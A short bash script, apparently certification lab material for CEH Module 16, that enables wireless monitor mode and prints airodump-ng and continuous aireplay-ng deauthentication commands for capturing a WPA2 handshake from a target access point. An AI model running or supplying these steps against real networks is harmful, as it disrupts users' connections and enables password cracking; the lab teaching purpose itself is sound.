#!/bin/bash
# LAB-ONLY: Wireless WPA2 Handshake Capture Helper
# CEH v13 Master Module 16
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_INTERFACE="wlan0"
LAB_MONITOR_INTERFACE="wlan0mon"
LAB_TARGET_BSSID="AA:BB:CC:DD:EE:FF"
LAB_TARGET_CHANNEL=6
# -----------------------------------------------------------------------------------

echo "[*] Stopping network managers..."
systemctl stop NetworkManager
airmon-ng check kill
echo "[*] Starting monitor mode..."
airmon-ng start $LAB_INTERFACE $LAB_TARGET_CHANNEL
echo "[*] Now run airodump-ng to capture the handshake: airodump-ng -c $LAB_TARGET_CHANNEL --bssid $LAB_TARGET_BSSID -w capture $LAB_MONITOR_INTERFACE"
echo "[*] In another terminal, run aireplay-ng to deauth: aireplay-ng --deauth 0 -a $LAB_TARGET_BSSID $LAB_MONITOR_INTERFACE"
